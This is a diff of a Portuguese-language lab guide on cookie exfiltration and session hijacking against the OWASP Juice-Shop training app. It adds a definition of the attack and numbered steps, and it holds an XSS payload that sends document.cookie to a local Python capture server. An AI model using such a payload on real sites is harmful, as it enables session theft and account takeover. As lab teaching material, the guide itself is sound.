@@ -1,8 +1,12 @@
+# Cookie Exfiltration
+
+A exfiltração de cookies (ou roubo de cookies) é um ataque em que um invasor intercepta ou extrai os arquivos de cookie de um usuário para se passar por ele em uma aplicação web, contornando o processo de autenticação (mecanismo conhecido como Session Hijacking ou Sequestro de Sessão). Como muitos sistemas utilizam cookies para armazenar tokens de sessão após o login, o invasor que possui esses dados ganha acesso imediato à conta da vítima sem precisar saber sua senha.
+
 ## Web-Server Exfiltration Basic Python
 
-Copiar o código python e salvar como web-srv.py
+1° Copiar o código python e salvar como web-srv.py
 
-Executar $python ./web-srv.py
+2° Executar $python ./web-srv.py
 
 ```
 #!/usr/bin/env python3
@@ -23,10 +27,11 @@ if __name__ == '__main__':
 ```
 Payload XSS para teste:
 
-Copie o payload e cole no campo de pesquisa do Juice-Shop
+3° Copie o payload e cole no campo de pesquisa do Juice-Shop
 ```
 <iframe srcdoc="<script> fetch('http://127.0.0.1/capture?token='+document.cookie)</script>"></iframe>
 ```
+
 ## Web-Server Exfiltration Web Link Python
 
 ```
